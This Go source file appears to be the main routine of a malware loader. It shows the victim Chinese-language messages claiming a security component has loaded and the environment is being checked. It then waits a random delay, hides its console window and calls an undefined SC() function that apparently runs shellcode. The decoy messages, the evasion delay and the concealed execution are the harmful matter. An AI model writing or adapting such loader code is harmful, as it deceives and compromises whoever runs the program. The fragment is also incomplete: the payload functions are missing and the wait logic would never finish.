package main

import (
	"flag"
	"fmt"
	"sync"
	"time"
)

var (
	console bool
)

func main() {
	//Welcome
	fmt.Println("[√] 成功加载安全组件")
	fmt.Println("[√] 检查运行环境...")
	time.Sleep(time.Second * time.Duration(2+time.Now().Unix()%5))
	fmt.Println("[√] 完成,即将关闭窗口")
	time.Sleep(time.Second * 3)

	hide(console)
	wg := sync.WaitGroup{}
	wg.Add(1)
	go func() {
		fmt.Println("[+] Call SC")
		SC()
		fmt.Println("[+] Bye~")
	}()
	wg.Wait()
}

func initialize() {
	flag.BoolVar(&console, "console", false, "信息输出")
	flag.Parse()
}
